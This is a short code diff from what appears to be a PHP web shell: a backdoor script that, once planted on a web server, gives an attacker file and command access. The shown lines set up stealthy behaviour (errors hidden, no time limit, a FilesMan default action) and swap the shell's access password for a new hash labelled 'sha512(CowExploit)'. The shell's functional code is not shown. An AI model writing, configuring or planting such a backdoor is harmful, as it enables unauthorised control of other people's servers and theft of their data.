@@ -10,7 +10,7 @@ set_time_limit(0);
 @ini_set('output_buffering', 0);
 @ini_set('display_errors', 0);
 
-$auth_pass = "1AG7pUcwgHFcUwbEkQoyTSyUb6HgwoZY69"; // sha512(CowExploit)
+$auth_pass = "d2667633b08d5877c6f6b55a7f0d6c7a898a7701e20da8d2fdc4cf38aa2d06894255c87bd6a81e4cd339196dedc0892df41c062103ab04ac9a917f0941ad1ac2"; // sha512(CowExploit)
 $color = "#00ff00";
 $default_action = 'FilesMan';
 $default_use_ajax = true;
